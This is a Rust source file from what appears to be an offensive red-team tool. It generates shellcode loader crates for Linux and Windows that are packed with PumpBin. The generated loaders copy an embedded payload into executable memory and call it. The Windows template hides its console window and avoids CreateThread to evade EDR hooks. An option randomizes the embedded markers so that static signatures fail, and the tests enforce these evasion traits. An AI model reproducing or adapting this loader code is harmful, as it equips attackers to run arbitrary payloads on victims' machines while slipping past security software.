//! Loader-crate scaffolding. Writes a buildable Cargo crate that
//! follows the PumpBin placeholder convention so authors don't have
//! to copy-paste `$$SHELLCODE$$` / `$$99999$$` magic strings by hand.
//!
//! Output of `pumpbin-cli new-loader <name>` is:
//!   <name>/Cargo.toml
//!   <name>/build.rs
//!   <name>/src/main.rs
//!
//! `cargo build --release` inside the new crate produces a binary
//! that `pumpbin-cli create-b1n` packs without further tweaking.

use anyhow::{anyhow, Result};
use rand::Rng;
use std::fs;
use std::path::Path;

use crate::Platform;

pub const DEFAULT_PREFIX: &str = "$$SHELLCODE$$";
pub const DEFAULT_SIZE_HOLDER: &str = "$$99999$$";
pub const DEFAULT_PAD_BYTES: usize = 1024 * 1024;

/// Knobs for `write_loader_scaffold`. Defaults reproduce pre-Step-11
/// behavior (1 MiB padding, the two literal `$$SHELLCODE$$` /
/// `$$99999$$` markers).
///
/// Set `padding_bytes` to a small value (e.g. 8 KiB) when scaffolding
/// a PIC-style loader where the 1 MiB default is wasteful. Set
/// `randomize_markers = true` to make every scaffolded crate carry a
/// unique prefix + size-holder so the markers stop being a stable
/// static signature across builds.
#[derive(Debug, Clone)]
pub struct LoaderOpts {
    pub padding_bytes: usize,
    pub randomize_markers: bool,
    /// When true, the scaffold emits a 4-byte size-holder and the
    /// loader parses it as a u32 little-endian length instead of a
    /// decimal ASCII string. Matches PumpBin's implicit-by-length
    /// convention in `replace_binary` (4-byte holder = u32 LE).
    /// Saves the `core::fmt` decimal-parse code path; useful for
    /// PIC loaders that want every byte to count.
    pub binary_size_holder: bool,
}

impl Default for LoaderOpts {
    fn default() -> Self {
        Self {
            padding_bytes: DEFAULT_PAD_BYTES,
            randomize_markers: false,
            binary_size_holder: false,
        }
    }
}

/// Concrete marker bytes for one scaffolded crate. Held in the
/// scaffold so the same values get woven into `build.rs`,
/// `src/main.rs`, and the `pumpbin-pack.sh` helper script
/// consistently.
#[derive(Debug, Clone)]
struct Markers {
    /// Where PumpBin's `memmem` finds the shellcode region.
    prefix: String,
    /// Where PumpBin's `memmem` finds the size-holder slot.
    /// Length must match `prefix` length expectations for
    /// PumpBin's patcher (default 9 bytes for a 9-digit decimal).
    size_holder: String,
}

impl Markers {
    fn default_static(binary_size_holder: bool) -> Self {
        Self {
            prefix: DEFAULT_PREFIX.to_string(),
            size_holder: if binary_size_holder {
                // 4 ASCII bytes; PumpBin's patcher detects len==4
                // and writes a u32 LE instead of decimal text.
                "LEN!".to_string()
            } else {
                DEFAULT_SIZE_HOLDER.to_string()
            },
        }
    }

    /// Generate a unique-per-build pair. Uses A-Z a-z 0-9 only —
    /// printable, shell-safe, no quoting hazard in the
    /// pumpbin-pack.sh that wraps these in `--prefix` flags.
    ///
    /// Prefix is always 13 bytes; size-holder is 4 bytes in
    /// binary-mode and 9 bytes in decimal mode.
    fn randomized(binary_size_holder: bool) -> Self {
        const ALPHABET: &[u8] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let mut rng = rand::thread_rng();
        let mut mk = |len: usize| -> String {
            (0..len)
                .map(|_| ALPHABET[rng.gen_range(0..ALPHABET.len())] as char)
                .collect()
        };
        Self {
            prefix: mk(13),
            size_holder: mk(if binary_size_holder { 4 } else { 9 }),
        }
    }
}

/// Write a new loader-crate scaffold at `dest`. Errors if `dest`
/// already exists.
pub fn write_loader_scaffold(
    dest: &Path,
    name: &str,
    platform: Platform,
    opts: LoaderOpts,
) -> Result<()> {
    if dest.exists() {
        return Err(anyhow!(
            "scaffold destination already exists: {}",
            dest.display()
        ));
    }
    fs::create_dir_all(dest.join("src"))?;

    let markers = if opts.randomize_markers {
        Markers::randomized(opts.binary_size_holder)
    } else {
        Markers::default_static(opts.binary_size_holder)
    };

    fs::write(dest.join("Cargo.toml"), cargo_toml(name, platform))?;
    fs::write(dest.join("build.rs"), build_rs(&markers, opts.padding_bytes))?;
    fs::write(
        dest.join("src/main.rs"),
        main_rs(platform, &markers, opts.binary_size_holder),
    )?;
    fs::write(
        dest.join("pumpbin-pack.sh"),
        pack_script(name, platform, &markers, opts.padding_bytes),
    )?;
    // Make the pack script executable on unix. Best-effort; we
    // ignore platforms where chmod is irrelevant.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = dest.join("pumpbin-pack.sh");
        if let Ok(meta) = fs::metadata(&path) {
            let mut perm = meta.permissions();
            perm.set_mode(0o755);
            let _ = fs::set_permissions(&path, perm);
        }
    }
    Ok(())
}

fn cargo_toml(name: &str, platform: Platform) -> String {
    let deps = match platform {
        Platform::Linux => "libc = \"0.2\"",
        // No Win32_System_Threading — the Windows scaffold runs shellcode
        // on the main thread to keep CreateThread out of the IAT.
        Platform::Windows => "windows-sys = { version = \"0.59\", features = [\"Win32_Foundation\", \"Win32_System_Memory\"] }",
        Platform::Darwin => "libc = \"0.2\"",
    };
    format!(
        r#"[package]
name = "{name}"
version = "0.1.0"
edition = "2021"

[dependencies]
{deps}

[profile.release]
opt-level = 3
lto = true
strip = true
codegen-units = 1
"#
    )
}

fn build_rs(markers: &Markers, padding_bytes: usize) -> String {
    format!(
        r##"// Generates a shellcode placeholder file that PumpBin patches at
// stamp-time. The prefix and padding length are baked in by the
// scaffolder so this build.rs and the pumpbin-pack.sh script that
// wraps `pumpbin-cli create-b1n` always agree.
use std::{{fs, iter}};

fn main() {{
    let mut sc = b"{prefix}".to_vec();
    sc.extend(iter::repeat(b'0').take({padding_bytes}));
    fs::write("shellcode", &sc).expect("write shellcode placeholder");
    println!("cargo:rerun-if-changed=build.rs");
}}
"##,
        prefix = markers.prefix,
        padding_bytes = padding_bytes,
    )
}

fn main_rs(platform: Platform, markers: &Markers, binary_size_holder: bool) -> String {
    match platform {
        Platform::Linux => linux_main_rs(markers, binary_size_holder),
        Platform::Windows => windows_main_rs(markers, binary_size_holder),
        Platform::Darwin => linux_main_rs(markers, binary_size_holder),
    }
}

fn size_holder_accessors(markers: &Markers, binary_size_holder: bool) -> String {
    if binary_size_holder {
        format!(
            r##"#[inline(never)]
fn get_size_holder_bytes() -> &'static [u8] {{
    // PumpBin overwrites these 4 bytes with a u32 little-endian
    // shellcode length. black_box keeps the bytes from being
    // constant-folded into the call-site.
    black_box(b"{size_holder}")
}}

#[inline(never)]
fn get_shellcode() -> &'static [u8] {{
    black_box(include_bytes!("../shellcode"))
}}

fn shellcode_len() -> usize {{
    let bytes: [u8; 4] = get_size_holder_bytes().try_into().expect("size holder must be 4 bytes");
    u32::from_le_bytes(bytes) as usize
}}
"##,
            size_holder = markers.size_holder,
        )
    } else {
        format!(
            r##"#[inline(never)]
fn get_size_holder() -> &'static str {{
    black_box("{size_holder}")
}}

#[inline(never)]
fn get_shellcode() -> &'static [u8] {{
    black_box(include_bytes!("../shellcode"))
}}

fn shellcode_len() -> usize {{
    get_size_holder()
        .parse()
        .expect("size holder must be a decimal length")
}}
"##,
            size_holder = markers.size_holder,
        )
    }
}

fn pack_script(
    name: &str,
    platform: Platform,
    markers: &Markers,
    padding_bytes: usize,
) -> String {
    let platform_str = match platform {
        Platform::Windows => "windows",
        Platform::Linux => "linux",
        Platform::Darwin => "darwin",
    };
    let template_path = match platform {
        Platform::Windows => format!("target/release/{name}.exe"),
        _ => format!("target/release/{name}"),
    };
    format!(
        r##"#!/usr/bin/env bash
# pumpbin-pack.sh — pack this loader crate into a .b1n with the right
# marker bytes baked in. Run after `cargo build --release`.
#
# Usage:  ./pumpbin-pack.sh [OUTPUT.b1n]
#         (default OUTPUT.b1n = {name}.b1n)
set -euo pipefail

OUT="${{1:-{name}.b1n}}"
TEMPLATE="{template_path}"

if [[ ! -f "$TEMPLATE" ]]; then
    echo "error: $TEMPLATE not built — run 'cargo build --release' first" >&2
    exit 1
fi

pumpbin-cli create-b1n \
    --template "$TEMPLATE" \
    --output   "$OUT" \
    --name     "{name}" \
    --platform {platform_str} \
    --type     exe \
    --prefix       '{prefix}' \
    --size-holder  '{size_holder}' \
    --max-len      {padding_bytes}

echo "wrote $OUT"
"##,
        name = name,
        template_path = template_path,
        platform_str = platform_str,
        prefix = markers.prefix,
        size_holder = markers.size_holder,
        padding_bytes = padding_bytes,
    )
}

fn linux_main_rs(markers: &Markers, binary_size_holder: bool) -> String {
    let accessors = size_holder_accessors(markers, binary_size_holder);
    format!(
        r##"//! Linux loader scaffold. Embeds a shellcode placeholder, extracts
//! the runtime length from the size-holder slot, allocates a
//! +x mapping with mmap, copies the shellcode in, and jumps.

use std::hint::black_box;
use std::ptr;

// Both accessors are `#[inline(never)]` + `black_box` so the
// optimizer can't prove the placeholders are unreachable and DCE
// them out of the binary. pumpbin-cli's stamp step finds the
// placeholders by byte pattern; if they get optimized away the
// pack step fails with PB-E0001.
{accessors}

fn main() {{
    let len = shellcode_len();
    let sc = &get_shellcode()[..len];

    unsafe {{
        let exec = libc::mmap(
            ptr::null_mut(),
            sc.len(),
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANON | libc::MAP_PRIVATE,
            -1,
            0,
        );
        assert!(exec != libc::MAP_FAILED, "mmap failed");
        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
        let f: extern "C" fn() = std::mem::transmute(exec);
        f();
    }}
}}
"##,
    )
}

fn windows_main_rs(markers: &Markers, binary_size_holder: bool) -> String {
    let accessors = size_holder_accessors(markers, binary_size_holder);
    format!(
        r##"//! Windows loader scaffold. Embeds a shellcode placeholder, extracts
//! the runtime length from the size-holder slot, allocates RWX
//! memory with VirtualAlloc, copies the shellcode in, and calls it
//! on the MAIN thread via a direct function-pointer call.
//!
//! Why not CreateThread: it's IAT-resolved kernel32 and one of the
//! most-hooked APIs across every EDR. The main-thread direct call
//! pattern lets any anti-evasion logic live inside the shellcode
//! itself (Crystal Palace, sleep masks, etc.) instead of being
//! short-circuited by a hooked thread spawn.

#![windows_subsystem = "windows"]

use std::hint::black_box;
use std::ptr;
use windows_sys::Win32::System::Memory::{{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
}};

{accessors}

fn main() {{
    let len = shellcode_len();
    let sc = &get_shellcode()[..len];

    unsafe {{
        let exec = VirtualAlloc(
            ptr::null(),
            sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        assert!(!exec.is_null(), "VirtualAlloc failed");
        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
        // Main-thread direct call. NO CreateThread / CreateRemoteThread.
        let f: extern "C" fn() = std::mem::transmute(exec);
        f();
    }}
}}
"##,
    )
}

// Pre-v2.0 had `write_post_build_module_scaffold` + helpers
// (validate_module_id / snake_to_camel / post_build_module_stub /
// append_pub_mod / register_post_build_module) here. That code
// targeted a registry model where modules required source-tree
// edits + recompile. v2.0 switched modules to NetExec-style
// folder autodetect (crate::modules::external) so the scaffold
// helpers are no longer wired into the CLI. Authors copy a
// template directory from `examples/modules/` instead.

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn linux_scaffold_writes_four_files() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        write_loader_scaffold(&dest, "scaffold", Platform::Linux, LoaderOpts::default()).unwrap();
        assert!(dest.join("Cargo.toml").is_file());
        assert!(dest.join("build.rs").is_file());
        assert!(dest.join("src/main.rs").is_file());
        assert!(dest.join("pumpbin-pack.sh").is_file());
    }

    #[test]
    fn refuses_to_overwrite() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        write_loader_scaffold(&dest, "scaffold", Platform::Linux, LoaderOpts::default()).unwrap();
        let err =
            write_loader_scaffold(&dest, "scaffold", Platform::Linux, LoaderOpts::default())
                .unwrap_err();
        assert!(err.to_string().contains("already exists"));
    }

    #[test]
    fn default_opts_use_static_markers() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        write_loader_scaffold(&dest, "scaffold", Platform::Linux, LoaderOpts::default()).unwrap();
        let build_rs = std::fs::read_to_string(dest.join("build.rs")).unwrap();
        assert!(build_rs.contains(DEFAULT_PREFIX));
        let main_rs = std::fs::read_to_string(dest.join("src/main.rs")).unwrap();
        assert!(main_rs.contains(DEFAULT_SIZE_HOLDER));
    }

    #[test]
    fn padding_bytes_flows_into_build_rs_and_pack_script() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        let opts = LoaderOpts {
            padding_bytes: 8192,
            ..LoaderOpts::default()
        };
        write_loader_scaffold(&dest, "scaffold", Platform::Linux, opts).unwrap();
        let build_rs = std::fs::read_to_string(dest.join("build.rs")).unwrap();
        assert!(build_rs.contains("8192"));
        assert!(!build_rs.contains("1024 * 1024"));
        let pack = std::fs::read_to_string(dest.join("pumpbin-pack.sh")).unwrap();
        assert!(pack.contains("--max-len      8192"));
    }

    #[test]
    fn randomized_markers_differ_from_static_and_match_pack_script() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        let opts = LoaderOpts {
            randomize_markers: true,
            ..LoaderOpts::default()
        };
        write_loader_scaffold(&dest, "scaffold", Platform::Linux, opts).unwrap();
        let build_rs = std::fs::read_to_string(dest.join("build.rs")).unwrap();
        let main_rs = std::fs::read_to_string(dest.join("src/main.rs")).unwrap();
        let pack = std::fs::read_to_string(dest.join("pumpbin-pack.sh")).unwrap();
        assert!(
            !build_rs.contains(DEFAULT_PREFIX),
            "randomized scaffold leaked default $$SHELLCODE$$"
        );
        assert!(
            !main_rs.contains(DEFAULT_SIZE_HOLDER),
            "randomized scaffold leaked default $$99999$$"
        );
        // Extract the prefix the scaffold actually chose, then
        // confirm pack.sh wraps that exact string in --prefix.
        let prefix_line = build_rs
            .lines()
            .find(|l| l.contains("b\""))
            .expect("build.rs must contain b\"<prefix>\"");
        let prefix = prefix_line
            .split('"')
            .nth(1)
            .expect("could not locate prefix string literal in build.rs");
        assert_eq!(prefix.len(), 13);
        assert!(pack.contains(&format!("--prefix       '{prefix}'")));
    }

    #[test]
    fn windows_scaffold_has_subsystem_attribute() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        write_loader_scaffold(&dest, "scaffold", Platform::Windows, LoaderOpts::default()).unwrap();
        let main_rs = std::fs::read_to_string(dest.join("src/main.rs")).unwrap();
        assert!(main_rs.contains("windows_subsystem"));
    }

    #[test]
    fn windows_scaffold_does_not_use_createthread() {
        let dir = tempdir().unwrap();
        let dest = dir.path().join("scaffold");
        write_loader_scaffold(&dest, "scaffold", Platform::Windows, LoaderOpts::default()).unwrap();
        let main_rs = std::fs::read_to_string(dest.join("src/main.rs")).unwrap();
        let cargo_toml = std::fs::read_to_string(dest.join("Cargo.toml")).unwrap();
        // Strip comment lines before checking — the explanatory docstring
        // mentions CreateThread by name. We care about call sites + uses.
        let code: String = main_rs
            .lines()
            .filter(|l| !l.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            !code.contains("CreateThread"),
            "Windows scaffold must not call CreateThread (OpSec regression)"
        );
        assert!(
            !cargo_toml.contains("Win32_System_Threading"),
            "Windows scaffold must not import Win32_System_Threading"
        );
    }
}
